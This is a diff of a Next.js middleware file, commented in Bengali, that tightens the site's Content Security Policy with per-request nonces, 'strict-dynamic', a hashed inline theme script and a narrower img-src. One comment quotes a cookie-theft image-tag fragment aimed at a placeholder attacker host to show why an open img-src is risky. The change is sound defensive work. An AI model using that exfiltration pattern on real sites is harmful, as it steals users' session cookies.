@@ -1,6 +1,7 @@
 import { NextResponse } from 'next/server';
 import type { NextRequest } from 'next/server';
 import { getToken } from 'next-auth/jwt';
+import { THEME_INIT_SCRIPT } from '@/lib/themeScript';
 
 /**
  * ═══════════════════════════════════════════════════════
@@ -12,35 +13,89 @@ import { getToken } from 'next-auth/jwt';
 
 const isProd = process.env.NODE_ENV === 'production';
 
-const CSP = [
-  "default-src 'self'",
+/**
+ * ★★★ H3 — CSP এখন প্রতি-অনুরোধে nonce সহ তৈরি হয়।
+ *
+ *   ── আগে কী সমস্যা ছিল ──
+ *   ১. `script-src` এ প্রোডাকশনেও `'unsafe-inline'` ছিল। CSP-র মূল
+ *      উদ্দেশ্যই XSS হলে ইনজেক্ট করা `<script>` আটকানো — `unsafe-inline`
+ *      থাকলে সেটি ঠিক ওই সুরক্ষাটিই বাতিল করে দেয়। অর্থাৎ হেডারটি
+ *      ছিল, কিন্তু স্ক্রিপ্টের বিরুদ্ধে কার্যত নিষ্ক্রিয়।
+ *   ২. `img-src` এ বেয়ার `https:` ছিল — যেকোনো origin থেকে ছবি।
+ *      ছবি দিয়ে তথ্য পাচার হয় (`<img src="https://attacker/?c="+document.cookie`
+ *      ধাঁচে), তাই এটি একটি প্রকৃত exfiltration পথ।
+ *
+ *   ── এখন ──
+ *   · প্রতি অনুরোধে random nonce; কেবল সেই nonce-যুক্ত ইনলাইন স্ক্রিপ্ট চলে
+ *   · `'strict-dynamic'` — nonce-বিশ্বস্ত স্ক্রিপ্ট যা লোড করে তাও চলে।
+ *     Tawk.to আমাদের নিজের কোড (`LiveChat.tsx`) `createElement('script')`
+ *     দিয়ে ইনজেক্ট করে, তাই সেটি এই পথেই অনুমোদিত।
+ *     ⚠️ `strict-dynamic` থাকলে ব্রাউজার host-তালিকা (`https://embed.tawk.to`)
+ *     **উপেক্ষা** করে — তাই সেগুলো আর script-src এ রাখা হয়নি; রাখলে
+ *     মিথ্যা নিরাপত্তার ছাপ তৈরি হতো।
+ *   · `img-src` থেকে বেয়ার `https:` সরানো হয়েছে
+ *
+ *   ⚠️ `style-src` এ `'unsafe-inline'` **রয়ে গেছে** — Next/Tailwind ও
+ *   framer-motion চলমান ইনলাইন স্টাইল বসায়; nonce দিয়ে সেটি ঢাকা যায় না।
+ *   স্টাইল-ইনজেকশন স্ক্রিপ্টের তুলনায় অনেক কম বিপজ্জনক, তবু এটি
+ *   অসম্পূর্ণ — সৎভাবে বলে রাখা হলো, "ঠিক হয়েছে" দাবি নয়।
+ */
+/**
+ * ★ ইনলাইন থিম-স্ক্রিপ্টের SHA-256 — একবার গণনা করে ক্যাশ।
+ *
+ *   কেন হ্যাশ, nonce নয়: nonce প্রতি অনুরোধে আলাদা, কিন্তু layout-এর
+ *   ওই `<script>` RSC পে-লোডেও যায়। ফলে প্রথম HTML ও পরের RSC
+ *   রেন্ডারে ভিন্ন nonce বসত এবং React hydration mismatch দিত
+ *   (dev-এ প্রকৃতপক্ষে মাপা: `Prop nonce did not match`)।
+ *   স্ক্রিপ্টটি স্থির, তাই হ্যাশ স্থির — সমস্যাটিই থাকে না।
+ *
+ *   ⚠️ CSP3: `'strict-dynamic'` থাকলে **host** উৎস উপেক্ষিত হয়,
+ *   কিন্তু nonce ও hash উৎস কার্যকরই থাকে।
+ */
+let cachedThemeHash: string | null = null;
+async function themeScriptHash(): Promise<string> {
+  if (cachedThemeHash) return cachedThemeHash;
+  const digest = await crypto.subtle.digest(
+    'SHA-256',
+    new TextEncoder().encode(THEME_INIT_SCRIPT),
+  );
+  let bin = '';
+  for (const b of new Uint8Array(digest)) bin += String.fromCharCode(b);
+  cachedThemeHash = `'sha256-${btoa(bin)}'`;
+  return cachedThemeHash;
+}
 
-  // Next.js এর inline script দরকার হয় (hydration)। dev এ eval ও লাগে।
-  // ★ Tawk.to লাইভ চ্যাট — embed.tawk.to থেকে স্ক্রিপ্ট
-  isProd
-    ? "script-src 'self' 'unsafe-inline' https://embed.tawk.to https://*.tawk.to"
-    : "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://embed.tawk.to https://*.tawk.to",
+function buildCsp(nonce: string, themeHash: string): string {
+  return [
+    "default-src 'self'",
 
-  "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://*.tawk.to",
-  "font-src 'self' https://fonts.gstatic.com https://*.tawk.to data:",
-  "img-src 'self' data: blob: https://*.public.blob.vercel-storage.com https:",
-  // ★ Tawk.to — লাইভ চ্যাটের জন্য WebSocket + API
-  "connect-src 'self' https://*.public.blob.vercel-storage.com https://*.tawk.to wss://*.tawk.to",
-  "media-src 'none'",
-  "object-src 'none'",           // Flash/plugin — সম্পূর্ণ বন্ধ
-  // ★ Tawk.to চ্যাট উইজেট iframe ব্যবহার করে
-  "frame-src https://*.tawk.to",
-  "frame-ancestors 'none'",      // clickjacking — আমাদের সাইট iframe এ বসানো যাবে না
-  // ফর্ম নিজের সাইটে; Google OAuth এর জন্য accounts.google.com অনুমোদিত
-  "form-action 'self' https://accounts.google.com",
-  "base-uri 'self'",             // <base> ট্যাগ দিয়ে হাইজ্যাক নয়
-  "manifest-src 'self'",
-  "worker-src 'self' blob:",
-  isProd ? 'upgrade-insecure-requests' : '',
-].filter(Boolean).join('; ');
+    // ★ nonce + strict-dynamic। dev-এ Next-এর HMR `eval` ব্যবহার করে।
+    isProd
+      ? `script-src 'self' 'nonce-${nonce}' ${themeHash} 'strict-dynamic'`
+      : `script-src 'self' 'nonce-${nonce}' ${themeHash} 'strict-dynamic' 'unsafe-eval'`,
 
-function secure(res: NextResponse): NextResponse {
-  res.headers.set('Content-Security-Policy', CSP);
+    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://*.tawk.to",
+    "font-src 'self' https://fonts.gstatic.com https://*.tawk.to data:",
+    // ★ বেয়ার `https:` সরানো — কেবল নিজের origin, data/blob, Blob স্টোরেজ ও Tawk
+    "img-src 'self' data: blob: https://*.public.blob.vercel-storage.com https://*.tawk.to",
+    // ★ Tawk.to — লাইভ চ্যাটের জন্য WebSocket + API
+    "connect-src 'self' https://*.public.blob.vercel-storage.com https://*.tawk.to wss://*.tawk.to",
+    "media-src 'none'",
+    "object-src 'none'",           // Flash/plugin — সম্পূর্ণ বন্ধ
+    // ★ Tawk.to চ্যাট উইজেট iframe ব্যবহার করে
+    "frame-src https://*.tawk.to",
+    "frame-ancestors 'none'",      // clickjacking — আমাদের সাইট iframe এ বসানো যাবে না
+    // ফর্ম নিজের সাইটে; Google OAuth এর জন্য accounts.google.com অনুমোদিত
+    "form-action 'self' https://accounts.google.com",
+    "base-uri 'self'",             // <base> ট্যাগ দিয়ে হাইজ্যাক নয়
+    "manifest-src 'self'",
+    "worker-src 'self' blob:",
+    isProd ? 'upgrade-insecure-requests' : '',
+  ].filter(Boolean).join('; ');
+}
+
+function secure(res: NextResponse, csp: string): NextResponse {
+  res.headers.set('Content-Security-Policy', csp);
 
   // ★ রিকোয়েস্ট-আইডি (observability) — লগে রিকোয়েস্ট কোরিলেট করতে,
   //   সাপোর্টে "Ref" হিসেবেও দেখানো যায়। ক্লায়েন্ট না দিলে জেনারেট।
@@ -93,9 +148,30 @@ export async function middleware(req: NextRequest) {
   // ★ রিকোয়েস্ট-আইডি — আগে থেকে থাকলে (প্রক্সি/CDN) সেটাই, নাহলে নতুন
   const requestId = req.headers.get('x-request-id') || crypto.randomUUID();
 
+  // ★★★ H3 — প্রতি অনুরোধে nonce। base64 (Next-এর ডকুমেন্টেড রীতি)।
+  const nonce = Buffer.from(crypto.randomUUID()).toString('base64');
+  const csp = buildCsp(nonce, await themeScriptHash());
+
+  /**
+   * ★ nonce দুই জায়গায় যেতে হয়:
+   *   ১. **রিকোয়েস্ট** হেডারে — Next নিজে এখান থেকে nonce পড়ে তার
+   *      নিজস্ব bootstrap/hydration স্ক্রিপ্টে বসায়। এটি না দিলে
+   *      Next-এর নিজের ইনলাইন স্ক্রিপ্টই CSP-তে আটকে যেত ও পাতা
+   *      হাইড্রেট হতো না।
+   *   ২. **রেসপন্স** হেডারে — ব্রাউজারের জন্য আসল নীতি।
+   *   `x-nonce` আলাদা করে দেওয়া হয় যাতে `layout.tsx` আমাদের নিজের
+   *   ইনলাইন থিম-স্ক্রিপ্টে সেটি বসাতে পারে।
+   */
+  const requestHeaders = new Headers(req.headers);
+  requestHeaders.set('x-nonce', nonce);
+  requestHeaders.set('Content-Security-Policy', csp);
+  requestHeaders.set('x-request-id', requestId);
+
+  const nextWithNonce = () => NextResponse.next({ request: { headers: requestHeaders } });
+
   const withId = (res: NextResponse): NextResponse => {
     res.headers.set('x-request-id', requestId);
-    return secure(res);
+    return secure(res, csp);
   };
 
   const isAdmin = pathname.startsWith('/admin');
@@ -117,7 +193,7 @@ export async function middleware(req: NextRequest) {
     }
   }
 
-  return withId(NextResponse.next());
+  return withId(nextWithNonce());
 }
 
 export const config = {
